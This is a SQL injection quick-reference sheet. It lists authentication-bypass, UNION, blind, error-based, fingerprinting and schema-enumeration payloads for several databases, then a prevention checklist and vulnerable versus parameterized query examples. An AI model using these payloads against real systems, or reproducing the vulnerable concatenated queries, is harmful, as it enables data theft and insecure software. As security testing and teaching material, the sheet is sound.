# SQL Injection - Quick Reference

## **Common Payloads**

### **Authentication Bypass**

```sql
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
' OR 1=1#
admin'--
' OR '1'='1'/*

```

### **Union-Based**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT username, password FROM users--
' UNION SELECT 1,2,3,4,5--

```

### **Time-Based Blind**

```sql
'; WAITFOR DELAY '00:00:05'--  (MSSQL)
'; SELECT SLEEP(5)--  (MySQL)
'; pg_sleep(5)--  (PostgreSQL)

```

### **Boolean-Based Blind**

```sql
' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--

```

### **Error-Based**

```sql
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

```

## **Database Fingerprinting**

### **MySQL**

```sql
' AND @@version LIKE 'MySQL%'--
' AND SELECT VERSION()--

```

### **MSSQL**

```sql
' AND @@version LIKE 'Microsoft%'--
' AND SELECT @@version--

```

### **PostgreSQL**

```sql
' AND version() LIKE 'PostgreSQL%'--
' AND SELECT version()--

```

## **Schema Enumeration**

### **MySQL**

```sql
-- List databases
' UNION SELECT schema_name FROM information_schema.schemata--

-- List tables
' UNION SELECT table_name FROM information_schema.tables--

-- List columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

```

### **MSSQL**

```sql
-- List databases
' UNION SELECT name FROM sys.databases--

-- List tables
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- List columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

```

## **Prevention Checklist**

- ✅ Use parameterized queries (prepared statements)
- ✅ Validate all input
- ✅ Use least privilege for database users
- ✅ Don't expose database errors
- ✅ Implement defense in depth
- ✅ Regular security testing
- ✅ Keep databases updated

## **Vulnerable Patterns**

```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"
query = "SELECT * FROM users WHERE username = '" + username + "'"
query = "SELECT * FROM users WHERE id = " + user_id

```

## **Secure Patterns**

```python
# ✅ SECURE
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))

query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))

```

## **Risk Levels**

| Vulnerability | Risk Level |
| --- | --- |
| Authentication Bypass | Critical |
| Data Extraction | Critical |
| Remote Code Execution | Critical |
| Data Manipulation | High |
| Denial of Service | Medium |

## **Tools**

- **SQLMap**: Automated SQL injection tool
- **Burp Suite**: Manual testing and scanning
- **OWASP ZAP**: Automated scanning
- **Custom Scripts**: Targeted testing